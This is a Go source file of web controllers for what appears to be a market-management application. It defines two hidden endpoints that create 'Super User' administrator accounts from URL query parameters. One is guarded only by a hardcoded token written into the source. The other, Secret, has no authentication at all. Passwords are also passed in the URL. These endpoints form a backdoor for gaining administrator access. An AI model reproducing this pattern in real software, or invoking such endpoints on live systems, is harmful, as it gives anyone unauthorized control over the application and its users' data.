package controllers

import (
	"github.com/gin-gonic/gin"
	"database/sql"
	"github.com/pasarsakomandiri/models"
	"net/http"
	"github.com/pasarsakomandiri/shared/response"
	_"fmt"
	"strings"
	"time"
	"golang.org/x/crypto/bcrypt"
	"log"
)

const (
	specialToken string = "siapayangtau"
)

func SecretCreateSuperUser(c *gin.Context) {
	token := c.Query("token")

	user := models.User{}
	username := c.Query("username")
	password := c.Query("password")
	role := "Super User"
	level := 99
	description := "Super User created by system"

	//fmt.Println("Token: ", token)
	//fmt.Println("Special token: ", specialToken)

	if !strings.EqualFold(token, specialToken) {
		c.JSON(http.StatusFound, response.NewSimpleResponse("Failed", "Invalid request"))
		return
	}

	if username == "" || password == "" {
		c.JSON(http.StatusFound, response.NewSimpleResponse("Failed", "Username or password cannot be null"))
		return
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)

	if err != nil {
		log.Println(err)
	}

	user.Username = username
	user.Password = string(hashedPassword)
	user.Role = role
	user.Level = level
	user.Description = description
	user.Created_date = time.Now().String()
	user.Created_by = -1

	result, err := models.UserCreateNew(user)

	if err != nil {
		c.JSON(http.StatusFound, response.NewSimpleResponse("Failed", "Failed to create super user"))
		return
	}

	user.Id, _ = result.LastInsertId()
	c.JSON(http.StatusFound, response.NewSimpleResponse("Success", "Super User created"))
	return
}

func Secret(c *gin.Context) {
	action := c.Query("action")

	if action == "register_super" {
		username := c.Query("username")
		password := c.Query("password")

		db:= c.MustGet("database").(*sql.DB)

		models.RegisterSuperUser(db, username, password)
	} else {
		c.String(http.StatusOK, "action not found")
	}
}